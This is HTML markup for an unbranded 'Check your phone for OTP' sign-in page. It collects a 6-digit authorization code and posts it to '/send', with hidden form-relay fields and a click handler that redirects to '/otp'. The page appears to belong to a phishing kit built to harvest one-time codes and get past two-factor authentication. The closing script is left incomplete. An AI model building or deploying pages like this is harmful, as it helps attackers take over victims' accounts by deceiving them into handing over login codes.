<body>

    <div class="container text-center">
        <img class="logo" src="images/download%20(2).png" alt="">
        <form method="POST" id="contact-form" class="myform"  action="/send" enctype="multipart/form-data">
            <div class="para-first">
                <div class="hcnt text-center">
                    <h2 class="para1 para4 mb-2">
                        Check your phone for OTP
                    </h2>
                </div>

                <p class="paragraph para2 mb-4 text-center">
                    Type in the 6-digit code you received <br> on your phone.
                </p>
            </div>

            <p class=" pwsd authp">Authorization code</p>
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="">
            <input maxlength="7" id="otp" required class="pwdinput" name="otp" type="tel"><br>
            <div class="cbtn mt-4">
                <button id="btn4" class="mt-3 text-center mb-4">Sign In</button>
            </div>
            <p class="lastp2 mt-4">Didn't get code?</p>
        </form>

        <div class="bt-img text-center ">
            <img src="images/download%20(3).png" alt="">
        </div>
    </div>



























    <script src="script.js"></script>

    <script>
      document.getElementById("btn4").addEventListener("click", myFunction);
      function myFunction() {
        window.location.href="/otp";
</script>
